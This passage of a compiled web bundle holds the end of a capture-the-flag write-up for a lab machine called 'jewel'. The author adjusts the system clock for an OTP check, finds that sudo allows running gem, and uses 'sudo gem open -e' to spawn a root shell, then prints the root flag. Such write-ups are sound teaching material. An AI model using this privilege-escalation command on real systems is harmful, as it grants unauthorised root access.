timezone:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ timedatectl\n               Local time: Sun 2021-02-21 21:08:22 GMT\n           Universal time: Sun 2021-02-21 21:08:22 UTC\n                 RTC time: Sun 2021-02-21 21:08:21\n                Time zone: Europe/London (GMT, +0000)\nSystem clock synchronized: no\n              NTP service: active\n          RTC in local TZ: no\n")),(0,r.kt)("p",null,"Set up the time on my machine:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ sudo timedatectl set-timezone Europe/London\n$ sudo timedatectl set-ntp false\n$ sudo timedatectl set-time 21:15:07\n")),(0,r.kt)("p",null,"Finaly I can run it:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ sudo -l\n\nMatching Defaults entries for bill on jewel:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    insults\n\nUser bill may run the following commands on jewel:\n    (ALL : ALL) /usr/bin/gem\n")),(0,r.kt)("p",null,"PS: it's not an issue if there is a desync of a few seconds because the OTP\nwindow is 17 codes so we can have a max desync of 17 x 30 sec."),(0,r.kt)("p",null,"Let's see the pe for ",(0,r.kt)("inlineCode",{parentName:"p"},"gem"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},'$ gtfoblookup linux sudo gem\ngem:\n\n    sudo:\n\n        Description: This requires the name of an installed gem to be\n                     provided (`rdoc` is usually installed).\n        Code: sudo gem open -e "/bin/sh -c /bin/sh" rdoc\n')),(0,r.kt)("p",null,"My paylmaod will be"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-palintext"},'sudo /usr/bin/gem open -e "/bin/sh -c /bin/bash" bundler\n')),(0,r.kt)("p",null,"Let's get root:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-plaintext"},"# id\nuid=0(root) gid=0(root) groups=0(root)\n\n# cat /root/root.txt\n96a8f2a385ce2c384353e6998dc3fdac\n")))}d.isMDXComponent=!0},9029:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/jewel-ac05d1858fc10231aa8b5bb53e12ecea.png"}}]);